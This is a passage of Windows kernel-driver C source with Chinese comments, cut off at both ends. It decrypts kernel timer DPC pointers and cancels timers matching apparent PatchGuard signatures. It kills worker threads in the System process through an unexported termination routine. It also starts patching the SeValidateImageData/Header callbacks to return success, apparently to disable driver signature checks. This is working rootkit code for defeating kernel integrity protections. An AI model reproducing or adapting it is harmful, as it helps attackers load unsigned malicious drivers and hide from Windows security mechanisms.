					(DWORD64)p_Dpc->DeferredRoutine < (kernelBase + KernelBaseSize ))
				{
					LOG_DEBUG("定时器对象：0x%p | 函数入口：ntos + 0x%p | 触发周期: %d \n ", p_Timer, (DWORD64)p_Dpc->DeferredRoutine - (DWORD64)kernelBase, p_Timer->Period);
					

			
					char* pDpc = p_Dpc->DeferredRoutine;
					DWORD64 uMemset = _CODE_GET_REAL_ADDRESS(_ASM_GET_CALL(pDpc, 1));
					if (uMemset == pMemset)
					{
						LOG_DEBUG("memset：0x%p   %p \n", pMemset, uMemset);
						LOG_DEBUG("移除 定时器对象：0x%p | 函数入口：ntos + 0x%p | 触发周期: %d \n ", p_Timer, (DWORD64)p_Dpc->DeferredRoutine - (DWORD64)kernelBase, p_Timer->Period);
						if (!KeCancelTimer(p_Timer))
						{
							LOG_DEBUG("定时器对象：0x%p Faild \n", p_Timer);
						}
					}
					else
					{
						char * pSarRax = _ASM_SAR_RAX(pDpc, 1);
						if (pSarRax != 0)
						{
							if (pSarRax[3] == (char)0x2F)
							{
								LOG_DEBUG("移除 定时器对象：0x%p | 函数入口：ntos + 0x%p | 触发周期: %d \n ", p_Timer, (DWORD64)p_Dpc->DeferredRoutine - (DWORD64)kernelBase, p_Timer->Period);
								if (!KeCancelTimer(p_Timer))
								{
									LOG_DEBUG("定时器对象：0x%p Faild \n", p_Timer);
								}
							} 

						}




					}


					//memset


					//if (p_Timer->DueTime.QuadPart == 0)
					//{
					//	if (!KeCancelTimer(p_Timer))
					//	{
					//		LOG_DEBUG("定时器对象：0x%p Faild \n", p_Timer);
					//	}
					//}
					





				}
				//else
				//{
				//	LOG_DEBUG("定时器对象No：0x%p | 函数入口：ntos + 0x%p | 触发周期: %d \n ", p_Timer, (DWORD64)p_Dpc->DeferredRoutine - (DWORD64)kernelBase, p_Timer->Period);
				//}

				//if ((DWORD64)p_Dpc->DeferredRoutine - (DWORD64)kernelBase == 0x89570)
				//{
				//	KeCancelTimer(p_Timer);
				//}

			}
		}
	}
}





void RemoveFlushDpcTimer_KiTimer() {

	OsVersion.dwOSVersionInfoSize = sizeof(OsVersion);
	RtlGetVersion((PRTL_OSVERSIONINFOW)&OsVersion);
	if (OsVersion.dwMajorVersion == 6 && OsVersion.dwMinorVersion == 1)
	{
		TimerTableOffset = 0;
	}
	else if (OsVersion.dwBuildNumber >= 17763 && OsVersion.dwBuildNumber < 18362) {

		TimerTableOffset = 0x3680;
	}
	else if (OsVersion.dwBuildNumber >= 18362 && OsVersion.dwBuildNumber < 19041) {
		TimerTableOffset = 0x3680;
	}
	else if (OsVersion.dwBuildNumber >= 19041 && OsVersion.dwBuildNumber < 20384) {
		TimerTableOffset = 0x3940;
	}


	//UNICODE_STRING  uc_KeSetTimer = { 0 };
	//RtlInitUnicodeString(&uc_KeSetTimer, L"KeSetTimerEx");

	//UNICODE_STRING  uc_Memset = { 0 };

	//RtlInitUnicodeString(&uc_Memset, L"memset");

	//DWORD64 pMemset = GetProcAddress_Kernel(kernelBase, "memset");

	//LOG_DEBUG(" Memset <%p>\n", pMemset);

	//char* CodeBegin = GetProcAddress_Kernel(kernelBase, "KeSetTimerEx");

	if (!KiWaitAlways || !KiWaitAlways)
	{
		KiWaitNever = _CODE_GET_REAL_ADDRESS_0(_ASM_MOV_RAX_2(KeSetTimerEx, 1), 3);
		KiWaitAlways = _CODE_GET_REAL_ADDRESS_0(_ASM_MOV_RSI_2(KeSetTimerEx, 1), 3);

		LOG_DEBUG("KiWaitNever  %I64X    KiWaitAlways %I64X\n", KiWaitNever, KiWaitAlways);

		if (!MmIsAddressValid(KiWaitAlways) || !MmIsAddressValid(KiWaitNever))
		{
			LOG_DEBUG("KiWaitNever  %I64X    KiWaitAlways %I64X  End 02 \n", KiWaitNever, KiWaitAlways);
			return;
		}

		if (!KiWaitAlways || !KiWaitAlways)
		{
			//LOG_DEBUG("KiWaitNever  %I64X    KiWaitAlways %I64X  End 01 \n", KiWaitNever, KiWaitAlways);
			return;
		}
	}

	



	//if (!KiWaitAlways || !KiWaitAlways)
	//{
	//	//LOG_DEBUG("KiWaitNever  %I64X    KiWaitAlways %I64X  End 01 \n", KiWaitNever, KiWaitAlways);
	//	return;
	//}

	//if (!MmIsAddressValid(KiWaitAlways) || !MmIsAddressValid(KiWaitNever))
	//{
	//	//LOG_DEBUG("KiWaitNever  %I64X    KiWaitAlways %I64X  End 02 \n", KiWaitNever, KiWaitAlways);
	//	return;
	//}


	INT i_cpuNum = KeNumberProcessors;

	for (KAFFINITY i = 0; i < i_cpuNum; i++)
	{
		// 线程绑定特定 CPU
		KeSetSystemAffinityThread(i + 1);

		// 获得 KPRCB 的地址
		ULONG64 p_PRCB = (ULONG64)__readmsr(0xC0000101) + 0x20;
		if (!MmIsAddressValid((PVOID64)p_PRCB))
		{
			//LOG_DEBUG("KiWaitNever  %I64X    KiWaitAlways %I64X\n", KiWaitNever, KiWaitAlways);
			return FALSE;
		}


		// 取消绑定 CPU
		KeRevertToUserAffinityThread();



		// 计算 TimerTable 在 _KPRCB 结构中的偏移
		PKTIMER_TABLE p_TimeTable = NULL;

		// Windows 10 得到_KPRCB + 0x3680

		if (TimerTableOffset == 0)
		{
			return;
		}

		p_TimeTable = (PKTIMER_TABLE)(*(PULONG64)p_PRCB + TimerTableOffset);

		DWORD64* GuardDpc = (*(PULONG64)p_PRCB + 0x80);

		*GuardDpc = 0;

		// 遍历 TimerEntries[] 数组（大小 256）
		for (INT j = 0; j < 256; j++)
		{
			// 获取 Entry 双向链表地址
			if (!MmIsAddressValid((PVOID64)p_TimeTable))
			{
				continue;
			}

			PLIST_ENTRY p_ListEntryHead = &(p_TimeTable->TimerEntries[j].Entry);

			// 遍历 Entry 双向链表
			for (PLIST_ENTRY p_ListEntry = p_ListEntryHead->Flink; p_ListEntry != p_ListEntryHead; p_ListEntry = p_ListEntry->Flink)
			{
				// 根据 Entry 取 _KTIMER 对象地址
				if (!MmIsAddressValid((PVOID64)p_ListEntry))
				{
					continue;
				}

				PKTIMER p_Timer = CONTAINING_RECORD(p_ListEntry, KTIMER, TimerListEntry);

				// 硬编码取 KiWaitNever 和 KiWaitAlways 
				//ULONG64 never = 0, always = 0;
				//if (get_KiWait(&never, &always) == FALSE)
				//{
				//	return FALSE;
				//}


				//LARGE_INTEGER

				// 获取解密前的 Dpc 对象
				if (!MmIsAddressValid((PVOID64)p_Timer))
				{
					continue;
				}

				ULONG64 ul_Dpc = (ULONG64)p_Timer->Dpc;
				INT i_Shift = (*((PULONG64)KiWaitNever) & 0xFF);

				// 解密 Dpc 对象
				ul_Dpc ^= *((ULONG_PTR*)KiWaitNever);         // 异或
				ul_Dpc = _rotl64(ul_Dpc, i_Shift);      // 循环左移
				ul_Dpc ^= (ULONG_PTR)p_Timer;           // 异或
				ul_Dpc = _byteswap_uint64(ul_Dpc);      // 颠倒顺序
				ul_Dpc ^= *((ULONG_PTR*)KiWaitAlways);        // 异或

				// 对象类型转换
				PKDPC p_Dpc = (PKDPC)ul_Dpc;

				// 打印验证
				if (!MmIsAddressValid((PVOID64)p_Dpc))
				{
					continue;
				}


				DWORD64 gFun = (DWORD64)p_Dpc->DeferredRoutine;
				DWORD v1 = *((DWORD*)gFun);
				DWORD v2 = *((DWORD*)(gFun + 4));
				DWORD v3 = *((DWORD*)(gFun + 8));


				DWORD bRun = 0;
				if (v1 == 0x1131482E) {
					bRun = 1;
				}
				else if (v1 == 0x48513148 &&
					v2 == 0x50513148) {
					bRun = 2;
				}
				else if (v1 == KiTimerDispatch[0] &&
					v2 == KiTimerDispatch[1] &&
					v3 == KiTimerDispatch[2]) {
					bRun = 3;
				}
				if (bRun) {

					if (!KeCancelTimer(p_Timer))
					{
						LOG_DEBUG("定时器对象：0x%p Faild \n", p_Timer);
					}
					else
					{
						LOG_DEBUG("移除定时器 定时器对象：0x%p %d\n", p_Timer, bRun);
					}

					//*((DWORD64*)(pQwordStackf + 0x28)) = (DWORD64)mGetCpuClockV;
				}

				//if (v1 == KiTimerDispatch[0] &&
				//	v2 == KiTimerDispatch[1] &&
				//	v3 == KiTimerDispatch[2]) {

				//	if (!KeCancelTimer(p_Timer))
				//	{
				//		LOG_DEBUG("定时器对象：0x%p Faild \n", p_Timer);
				//	}
				//	else
				//	{
				//		LOG_DEBUG("移除定时器 定时器对象：0x%p\n", p_Timer);
				//	}

				//}

				//LOG_DEBUG("定时器对象：0x%p | 函数入口：ntos + 0x%p | 触发周期: %d \n ", p_Timer,   (DWORD64)p_Dpc->DeferredRoutine - (DWORD64)kernelBase, p_Timer->Period);
				//WORK_QUEUE_TYPE
				//if ((DWORD64)p_Dpc->DeferredRoutine > (DWORD64)kernelBase &&
				//	(DWORD64)p_Dpc->DeferredRoutine < (kernelBase + KernelBaseSize))
				//{
				//	LOG_DEBUG("定时器对象：0x%p | 函数入口：ntos + 0x%p | 触发周期: %d \n ", p_Timer, (DWORD64)p_Dpc->DeferredRoutine - (DWORD64)kernelBase, p_Timer->Period);



				//	char* pDpc = p_Dpc->DeferredRoutine;
				//	DWORD64 uMemset = _CODE_GET_REAL_ADDRESS(_ASM_GET_CALL(pDpc, 1));
				//	if (uMemset == pMemset)
				//	{
				//		LOG_DEBUG("memset：0x%p   %p \n", pMemset, uMemset);
				//		LOG_DEBUG("移除 定时器对象：0x%p | 函数入口：ntos + 0x%p | 触发周期: %d \n ", p_Timer, (DWORD64)p_Dpc->DeferredRoutine - (DWORD64)kernelBase, p_Timer->Period);
				//		if (!KeCancelTimer(p_Timer))
				//		{
				//			LOG_DEBUG("定时器对象：0x%p Faild \n", p_Timer);
				//		}
				//	}
				//	else
				//	{
				//		char* pSarRax = _ASM_SAR_RAX(pDpc, 1);
				//		if (pSarRax != 0)
				//		{
				//			if (pSarRax[3] == (char)0x2F)
				//			{
				//				LOG_DEBUG("移除 定时器对象：0x%p | 函数入口：ntos + 0x%p | 触发周期: %d \n ", p_Timer, (DWORD64)p_Dpc->DeferredRoutine - (DWORD64)kernelBase, p_Timer->Period);
				//				if (!KeCancelTimer(p_Timer))
				//				{
				//					LOG_DEBUG("定时器对象：0x%p Faild \n", p_Timer);
				//				}
				//			}

				//		}




				//	}


				//	//memset


				//	//if (p_Timer->DueTime.QuadPart == 0)
				//	//{
				//	//	if (!KeCancelTimer(p_Timer))
				//	//	{
				//	//		LOG_DEBUG("定时器对象：0x%p Faild \n", p_Timer);
				//	//	}
				//	//}






				//}
				//else
				//{
				//	LOG_DEBUG("定时器对象No：0x%p | 函数入口：ntos + 0x%p | 触发周期: %d \n ", p_Timer, (DWORD64)p_Dpc->DeferredRoutine - (DWORD64)kernelBase, p_Timer->Period);
				//}

				//if ((DWORD64)p_Dpc->DeferredRoutine - (DWORD64)kernelBase == 0x89570)
				//{
				//	KeCancelTimer(p_Timer);
				//}

			}
		}
	}
}


typedef struct _KDPC_LIST
{
	SINGLE_LIST_ENTRY ListHead;
	SINGLE_LIST_ENTRY *ListEntry;
}KDPC_LIST;

typedef struct _KDPC_DATA{

	KDPC_LIST  DpcList;
	DWORD64  DpcLock;
	DWORD  DpcQueueDepth;
	DWORD DpcCount;
	KDPC ActiveDpc;
}KDPC_DATA;





void RemoveFlushDpcQueue() {

	//UNICODE_STRING  uc_KeSetTimer = { 0 };
	//RtlInitUnicodeString(&uc_KeSetTimer, L"KeSetTimerEx");

	//char* CodeBegin = GetProcAddress_Kernel(kernelBase, "KeSetTimerEx");


	//DWORD64* KiWaitNever = _CODE_GET_REAL_ADDRESS_0(_ASM_MOV_RAX_2(CodeBegin, 1), 3);
	//DWORD64* KiWaitAlways = _CODE_GET_REAL_ADDRESS_0(_ASM_MOV_RSI_2(CodeBegin, 1), 3);

	//LOG_DEBUG("KiWaitNever  %I64X    KiWaitAlways %I64X\n", KiWaitNever, KiWaitAlways);

	//if (!KiWaitAlways || !KiWaitAlways)
	//{
	//	return;
	//}

	//if (!MmIsAddressValid(KiWaitAlways) || !MmIsAddressValid(KiWaitNever))
	//{
	//	return;
	//}


	DWORD DpcTableOffset = 0;

	OsVersion.dwOSVersionInfoSize = sizeof(OsVersion);
	RtlGetVersion((PRTL_OSVERSIONINFOW)&OsVersion);
	if (OsVersion.dwMajorVersion == 6 && OsVersion.dwMinorVersion == 1)
	{
		DpcTableOffset = 0;
	}
	else if (OsVersion.dwBuildNumber >= 17763 && OsVersion.dwBuildNumber < 18362) {

		DpcTableOffset = 0x2E00;
	}
	else if (OsVersion.dwBuildNumber >= 18362 && OsVersion.dwBuildNumber < 19041) {
		DpcTableOffset = 0x2E00;
	}
	else if (OsVersion.dwBuildNumber >= 19041 && OsVersion.dwBuildNumber < 20384) {
		DpcTableOffset = 0x30C0;
	}




	if (DpcTableOffset == 0)
	{
		return;
	}



	INT i_cpuNum = KeNumberProcessors;

	for (KAFFINITY i = 0; i < i_cpuNum; i++)
	{
		// 线程绑定特定 CPU
		KeSetSystemAffinityThread(i + 1);

		// 获得 KPRCB 的地址
		ULONG64 p_PRCB = (ULONG64)__readmsr(0xC0000101) + 0x20;
		if (!MmIsAddressValid((PVOID64)p_PRCB))
		{
			return FALSE;
		}


		// 取消绑定 CPU
		KeRevertToUserAffinityThread();


		
		// 计算 TimerTable 在 _KPRCB 结构中的偏移
		KDPC_DATA* p_DpcTable = NULL;

		// Windows 10 得到_KPRCB + 0x3680

		//if (TimerTableOffset == 0)
		//{
		//	return;
		//}
		//  19043  30c0
		p_DpcTable = (KDPC_DATA*)(*(PULONG64)p_PRCB + DpcTableOffset);

		LOG_DEBUG("p_DpcTable：0x%p  DpcCount:%d\n", p_DpcTable, p_DpcTable->DpcCount);



		if (p_DpcTable->DpcQueueDepth == 0)
		{
			LOG_DEBUG("p_DpcTable.DpcQueueDepth == 0  %d\n", p_DpcTable->DpcQueueDepth, i);
			continue;

		}
		
		SINGLE_LIST_ENTRY* p_DpcListEntry = p_DpcTable->DpcList.ListHead.Next;


		while (p_DpcListEntry != 0){

			KDPC* pDpc = (DWORD64)p_DpcListEntry - 8;
			LOG_DEBUG("DPCQUEN：0x%p  DeferredRoutine<%p>  DeferredContext<%p>  ProcessorHistory <%p>\n", pDpc, pDpc->DeferredRoutine, pDpc->DeferredContext, pDpc->ProcessorHistory);



			p_DpcListEntry = p_DpcListEntry->Next;
		}
		//KeInitializeThreadedDpc()


		//p_DpcTable = (KDPC_DATA*)(*(PULONG64)p_PRCB + 0x2E28);

		//LOG_DEBUG("p_DpcTable：0x%p  DpcCount:%d\n", p_DpcTable, p_DpcTable->DpcCount);


		//p_DpcListEntry = &p_DpcTable->DpcList.ListEntry;
		//while (p_DpcListEntry != 0) {


		//	KDPC* pDpc = (DWORD64)p_DpcListEntry - 8;

		//	LOG_DEBUG("DPCQUEN：0x%p  DeferredRoutine<%p>  DeferredContext<%p>\n", pDpc, pDpc->DeferredRoutine, pDpc->DeferredContext);
		//	p_DpcListEntry = p_DpcListEntry->Next;
		//}


		// 遍历 TimerEntries[] 数组（大小 256）
		//for (INT j = 0; j < 256; j++)
		//{
		//	// 获取 Entry 双向链表地址
		//	if (!MmIsAddressValid((PVOID64)p_TimeTable))
		//	{
		//		continue;
		//	}

		//	PLIST_ENTRY p_ListEntryHead = &(p_TimeTable->TimerEntries[j].Entry);

		//	// 遍历 Entry 双向链表
		//	for (PLIST_ENTRY p_ListEntry = p_ListEntryHead->Flink; p_ListEntry != p_ListEntryHead; p_ListEntry = p_ListEntry->Flink)
		//	{
		//		// 根据 Entry 取 _KTIMER 对象地址
		//		if (!MmIsAddressValid((PVOID64)p_ListEntry))
		//		{
		//			continue;
		//		}

		//		PKTIMER p_Timer = CONTAINING_RECORD(p_ListEntry, KTIMER, TimerListEntry);

		//		// 硬编码取 KiWaitNever 和 KiWaitAlways 
		//		//ULONG64 never = 0, always = 0;
		//		//if (get_KiWait(&never, &always) == FALSE)
		//		//{
		//		//	return FALSE;
		//		//}

		//		// 获取解密前的 Dpc 对象
		//		if (!MmIsAddressValid((PVOID64)p_Timer))
		//		{
		//			continue;
		//		}

		//		ULONG64 ul_Dpc = (ULONG64)p_Timer->Dpc;
		//		INT i_Shift = (*((PULONG64)KiWaitNever) & 0xFF);

		//		// 解密 Dpc 对象
		//		ul_Dpc ^= *((ULONG_PTR*)KiWaitNever);         // 异或
		//		ul_Dpc = _rotl64(ul_Dpc, i_Shift);      // 循环左移
		//		ul_Dpc ^= (ULONG_PTR)p_Timer;           // 异或
		//		ul_Dpc = _byteswap_uint64(ul_Dpc);      // 颠倒顺序
		//		ul_Dpc ^= *((ULONG_PTR*)KiWaitAlways);        // 异或

		//		// 对象类型转换
		//		PKDPC p_Dpc = (PKDPC)ul_Dpc;

		//		// 打印验证
		//		if (!MmIsAddressValid((PVOID64)p_Dpc))
		//		{
		//			continue;
		//		}
		//		//LOG_DEBUG("定时器对象：0x%p | 函数入口：ntos + 0x%p | 触发周期: %d \n ", p_Timer,   (DWORD64)p_Dpc->DeferredRoutine - (DWORD64)kernelBase, p_Timer->Period);

		//		if ((DWORD64)p_Dpc->DeferredRoutine > (DWORD64)kernelBase && (DWORD64)p_Dpc->DeferredRoutine < (kernelBase + KernelBaseSize))
		//		{
		//			LOG_DEBUG("定时器对象：0x%p | 函数入口：ntos + 0x%p | 触发周期: %d \n ", p_Timer, (DWORD64)p_Dpc->DeferredRoutine - (DWORD64)kernelBase, p_Timer->Period);
		//			KeCancelTimer(p_Timer);
		//		}

		//		//if ((DWORD64)p_Dpc->DeferredRoutine - (DWORD64)kernelBase == 0x89570)
		//		//{
		//		//	KeCancelTimer(p_Timer);
		//		//}

		//	}
		//}
	}
}





typedef  NTSTATUS(NTAPI* _PspTerminateThreadByPointer)(PETHREAD ethrread, NTSTATUS ExitCode, BOOLEAN Flags);


extern LONG ThreadStartRoutineOffsetBegin;

void RemoveThreadWorkItem() {

	//UNICODE_STRING  uc_KeSetTimer = { 0 };
	//RtlInitUnicodeString(&uc_KeSetTimer, L"KeSetTimerEx");

	//char* CodeBegin = GetProcAddress_Kernel(kernelBase, "KeSetTimerEx");


	//DWORD64* KiWaitNever = _CODE_GET_REAL_ADDRESS_0(_ASM_MOV_RAX_2(CodeBegin, 1), 3);
	//DWORD64* KiWaitAlways = _CODE_GET_REAL_ADDRESS_0(_ASM_MOV_RSI_2(CodeBegin, 1), 3);

	//LOG_DEBUG("KiWaitNever  %I64X    KiWaitAlways %I64X\n", KiWaitNever, KiWaitAlways);

	//if (!KiWaitAlways || !KiWaitAlways)
	//{
	//	return;
	//}

	//if (!MmIsAddressValid(KiWaitAlways) || !MmIsAddressValid(KiWaitNever))
	//{
	//	return;
	//}


	while (ThreadStartRoutineOffsetBegin == 0){
		wSleep(200);
	}



	char * pTerminateSystemThread = (char *)&PsTerminateSystemThread;
	
	_PspTerminateThreadByPointer  PspTerminateThreadByPointer = _CODE_GET_REAL_ADDRESS(_ASM_GET_CALL(pTerminateSystemThread, 1));


	LOG_DEBUG("PspTerminateThreadByPointer <%p> \n", PspTerminateThreadByPointer);


	HANDLE TArry[1024] = { 0 };

	int nCount = 0;

	PEPROCESS eprocess;
	if (NT_SUCCESS(PsLookupProcessByProcessId(4, &eprocess)))
	{
		PLIST_ENTRY  pThreadListHead = (PLIST_ENTRY)((DWORD64)eprocess + 0x30);

		PLIST_ENTRY  Entry = pThreadListHead->Flink;

		while (Entry != pThreadListHead){

			PETHREAD ethread =  (PETHREAD)((DWORD64)Entry - 0x2F8);

			DISPATCHER_HEADER* pDHeader = (DISPATCHER_HEADER*)((DWORD64)ethread + 0xE8);

			

			//WORK_QUEUE_TYPE
			Entry = Entry->Flink;
			if (pDHeader->QueueType != 0)
			{

				DWORD64 StartRoutione = *((DWORD64*)((DWORD64)ethread + ThreadStartRoutineOffsetBegin));

				if (StartRoutione > (DWORD64)kernelBase && StartRoutione < (kernelBase + KernelBaseSize))
				{




					LOG_DEBUG(" ethread <%p> %d    QueueType %d \n", ethread, PsGetThreadId(ethread), pDHeader->QueueType);

					TArry[nCount] = PsGetThreadId(ethread);
					nCount++;
					if (nCount == 1024)
					{
						break;
					}
				}

			}
		}
		ObDereferenceObject(eprocess);
	}
	

	HANDLE CurTID = PsGetCurrentThreadId();

	if (nCount != 0)
	{
		for (size_t i = 0; i < nCount; i++)
		{
			if (CurTID != TArry[i])
			{
				PETHREAD ethread = 0;
				if (NT_SUCCESS(PsLookupThreadByThreadId(TArry[i], &ethread)))
				{
					PspTerminateThreadByPointer(ethread, 0, 1);
					ObDereferenceObject(ethread);
				}
			}
			//
		}

	}



	//PETHREAD
	//DISPATCHER_HEADER  dHeader;
	////IoQueueWorkItem()

	//INT i_cpuNum = KeNumberProcessors;

	//for (KAFFINITY i = 0; i < i_cpuNum; i++)
	//{
	//	// 线程绑定特定 CPU
	//	KeSetSystemAffinityThread(i + 1);

	//	// 获得 KPRCB 的地址
	//	ULONG64 p_PRCB = (ULONG64)__readmsr(0xC0000101) + 0x20;
	//	if (!MmIsAddressValid((PVOID64)p_PRCB))
	//	{
	//		return FALSE;
	//	}


	//	// 取消绑定 CPU
	//	KeRevertToUserAffinityThread();



	//	// 计算 TimerTable 在 _KPRCB 结构中的偏移
	//	KDPC_DATA* p_DpcTable = NULL;

	//	// Windows 10 得到_KPRCB + 0x3680

	//	//if (TimerTableOffset == 0)
	//	//{
	//	//	return;
	//	//}
	//	//  19043  30c0
	//	p_DpcTable = (KDPC_DATA*)(*(PULONG64)p_PRCB + 0x2E00);




	//	LOG_DEBUG("p_DpcTable：0x%p  DpcCount:%d\n", p_DpcTable, p_DpcTable->DpcCount);


	//	SINGLE_LIST_ENTRY* p_DpcListEntry = p_DpcTable->DpcList.ListEntry;

	//	while (p_DpcListEntry != 0) {

	//		KDPC* pDpc = (DWORD64)p_DpcListEntry - 8;
	//		LOG_DEBUG("DPCQUEN：0x%p  DeferredRoutine<%p>  DeferredContext<%p>\n", pDpc, pDpc->DeferredRoutine, pDpc->DeferredContext);
	//		p_DpcListEntry = p_DpcListEntry->Next;
	//	}
	//	//KeInitializeThreadedDpc()


	//	//p_DpcTable = (KDPC_DATA*)(*(PULONG64)p_PRCB + 0x2E28);

	//	//LOG_DEBUG("p_DpcTable：0x%p  DpcCount:%d\n", p_DpcTable, p_DpcTable->DpcCount);


	//	//p_DpcListEntry = &p_DpcTable->DpcList.ListEntry;
	//	//while (p_DpcListEntry != 0) {


	//	//	KDPC* pDpc = (DWORD64)p_DpcListEntry - 8;

	//	//	LOG_DEBUG("DPCQUEN：0x%p  DeferredRoutine<%p>  DeferredContext<%p>\n", pDpc, pDpc->DeferredRoutine, pDpc->DeferredContext);
	//	//	p_DpcListEntry = p_DpcListEntry->Next;
	//	//}


	//	// 遍历 TimerEntries[] 数组（大小 256）
	//	//for (INT j = 0; j < 256; j++)
	//	//{
	//	//	// 获取 Entry 双向链表地址
	//	//	if (!MmIsAddressValid((PVOID64)p_TimeTable))
	//	//	{
	//	//		continue;
	//	//	}

	//	//	PLIST_ENTRY p_ListEntryHead = &(p_TimeTable->TimerEntries[j].Entry);

	//	//	// 遍历 Entry 双向链表
	//	//	for (PLIST_ENTRY p_ListEntry = p_ListEntryHead->Flink; p_ListEntry != p_ListEntryHead; p_ListEntry = p_ListEntry->Flink)
	//	//	{
	//	//		// 根据 Entry 取 _KTIMER 对象地址
	//	//		if (!MmIsAddressValid((PVOID64)p_ListEntry))
	//	//		{
	//	//			continue;
	//	//		}

	//	//		PKTIMER p_Timer = CONTAINING_RECORD(p_ListEntry, KTIMER, TimerListEntry);

	//	//		// 硬编码取 KiWaitNever 和 KiWaitAlways 
	//	//		//ULONG64 never = 0, always = 0;
	//	//		//if (get_KiWait(&never, &always) == FALSE)
	//	//		//{
	//	//		//	return FALSE;
	//	//		//}

	//	//		// 获取解密前的 Dpc 对象
	//	//		if (!MmIsAddressValid((PVOID64)p_Timer))
	//	//		{
	//	//			continue;
	//	//		}

	//	//		ULONG64 ul_Dpc = (ULONG64)p_Timer->Dpc;
	//	//		INT i_Shift = (*((PULONG64)KiWaitNever) & 0xFF);

	//	//		// 解密 Dpc 对象
	//	//		ul_Dpc ^= *((ULONG_PTR*)KiWaitNever);         // 异或
	//	//		ul_Dpc = _rotl64(ul_Dpc, i_Shift);      // 循环左移
	//	//		ul_Dpc ^= (ULONG_PTR)p_Timer;           // 异或
	//	//		ul_Dpc = _byteswap_uint64(ul_Dpc);      // 颠倒顺序
	//	//		ul_Dpc ^= *((ULONG_PTR*)KiWaitAlways);        // 异或

	//	//		// 对象类型转换
	//	//		PKDPC p_Dpc = (PKDPC)ul_Dpc;

	//	//		// 打印验证
	//	//		if (!MmIsAddressValid((PVOID64)p_Dpc))
	//	//		{
	//	//			continue;
	//	//		}
	//	//		//LOG_DEBUG("定时器对象：0x%p | 函数入口：ntos + 0x%p | 触发周期: %d \n ", p_Timer,   (DWORD64)p_Dpc->DeferredRoutine - (DWORD64)kernelBase, p_Timer->Period);

	//	//		if ((DWORD64)p_Dpc->DeferredRoutine > (DWORD64)kernelBase && (DWORD64)p_Dpc->DeferredRoutine < (kernelBase + KernelBaseSize))
	//	//		{
	//	//			LOG_DEBUG("定时器对象：0x%p | 函数入口：ntos + 0x%p | 触发周期: %d \n ", p_Timer, (DWORD64)p_Dpc->DeferredRoutine - (DWORD64)kernelBase, p_Timer->Period);
	//	//			KeCancelTimer(p_Timer);
	//	//		}

	//	//		//if ((DWORD64)p_Dpc->DeferredRoutine - (DWORD64)kernelBase == 0x89570)
	//	//		//{
	//	//		//	KeCancelTimer(p_Timer);
	//	//		//}

	//	//	}
	//	//}
	//}
}


DEFINE_GUID(KernelProvGuid,
	0xA68CA8B7, 0x004F, 0xD7B6, 0xA6, 0x98, 0x07, 0xE2, 0xDE, 0x0F, 0x1F, 0x5D);


void __fastcall EtwpTracingProvEnableTimeCallback(
	_In_ LPCGUID SourceId,
	_In_ ULONG ControlCode,
	_In_ UCHAR Level,
	_In_ ULONGLONG MatchAnyKeyword,
	_In_ ULONGLONG MatchAllKeyword,
	_In_opt_ PEVENT_FILTER_DESCRIPTOR FilterData,
	_Inout_opt_ PVOID CallbackContext) {






	LOG_DEBUG("CallbackContext %I64X\n", CallbackContext);



}

REGHANDLE hTimeEtw = 0;

typedef struct _TIMER_DPC_INFO_0 {
	KDPC Dpc;
	PKDEFERRED_ROUTINE DeferredRoutine;
	// SOCKET sockfd;
	KTIMER Timer;
	//SOCKET_BUFFER* SocketBuffer;
}TIMER_DPC_INFO_0;


VOID PollingDpcTimer(PKDPC pDpc, PVOID pContext, PVOID SysArg1, PVOID SysArg2) {




	LOG_DEBUG("PollingDpcTimer %I64X\n", pDpc);




}


DWORD64 guard_icall_bitmap = 0;

void __fastcall guard_check_icall(uintptr_t Target)
{
	__int64 v1; // rdx
	unsigned __int64 v2; // r10
	unsigned __int64 v3; // r10

	if ((Target & 0x8000000000000000ui64) == 0i64)
		goto LABEL_8;
	if (!guard_icall_bitmap)
		return;
	v1 = *(DWORD64*)(guard_icall_bitmap + 8 * (Target >> 9));
	v2 = Target >> 3;
	if ((Target & 0xF) == 0)
	{
		if (_bittest64(&v1, v2))
			return;
	LABEL_8:
		//guard_icall_bugcheck(Target);
		LOG_DEBUG("Need guard_icall_bugcheck");
		return;
	}
	v3 = v2 & 0xFFFFFFFFFFFFFFFEui64;
	if (!_bittest64(&v1, v3) || !_bittest64(&v1, v3 | 1))
		goto LABEL_8;
}

BOOLEAN cmp_char(char* _left, char* _right, int len) {

	for (size_t iChar = 0; iChar < len; iChar++) {

		if (_left[iChar] == (char)0x90)
			continue;

		if (_left[iChar] != _right[iChar])
			return FALSE;

	}
	return TRUE;
}


char* _findMemoryV(char* va, DWORD vaSize, char* val, DWORD nSize) {



	char* Vbegin = va;
	DWORD fSize = vaSize;

	for (DWORD i = 0; i < (fSize - nSize); i++){

		if ((((ULONG64)Vbegin + i) % PAGE_SIZE) == 0)
		{
			if (!MmIsAddressValid(Vbegin + i)){
				Vbegin += PAGE_SIZE - 1;
				fSize -= PAGE_SIZE;
				continue;
			} 
		}
		if (cmp_char(val, Vbegin + i, nSize)) {
			return va + i;
		}
	}
	return 0;
}




char* _findTrueRet(char* BeginVal) {


	char RetVal[] = { 0xB8,0x01,0,0,0,0xC3 };

	for (ULONGLONG i = BeginVal; i < kernelBase + KernelBaseSize; i++){

		if (cmp_char(RetVal, i, sizeof(RetVal))){
			return i;
		}
	}
	//cmp_char()
	return 0;

 }


extern char* _ASM_MOV_RAX_2(char* pAdr, int num);

void DisableFromSeValidateImage() {

	if (uSeValidateImageData == 0 || uSeValidateImageHeader == 0)
	{
		LOG_DEBUG("Error Map  uSeValidateImageData<%p>  uSeValidateImageHeader<%p>\n", uSeValidateImageData, uSeValidateImageHeader);
		return;
	}

	ULONGLONG SeValidateImageData_CALLBACK =  _ASM_GET_CALL((char*)uSeValidateImageData, 1);
	ULONGLONG SeValidateImageHeader_CALLBACK = _ASM_GET_CALL((char*)uSeValidateImageHeader, 1);

	ULONGLONG ptrCALL_Data = _CODE_GET_REAL_ADDRESS_0(_ASM_MOV_RAX_2(uSeValidateImageData, 1), 3);

	ULONGLONG ptrCALL_Header = ptrCALL_Data - 8;

	ULONGLONG ptrCALL_HashMemory = ptrCALL_Data + 8;

	ULONGLONG SeValidateImageData_RET = _findTrueRet(SeValidateImageData_CALLBACK + 5);
	ULONGLONG SeValidateImageHeader_RET = _findTrueRet(SeValidateImageHeader_CALLBACK + 5);

	LOG_DEBUG("Data CALL <%p><BASE+%08X>  Header CALL<%p><BASE+%08X>   <%p>\n",
		*(ULONGLONG*)ptrCALL_Data, *(ULONGLONG*)ptrCALL_Data - kernelBase,
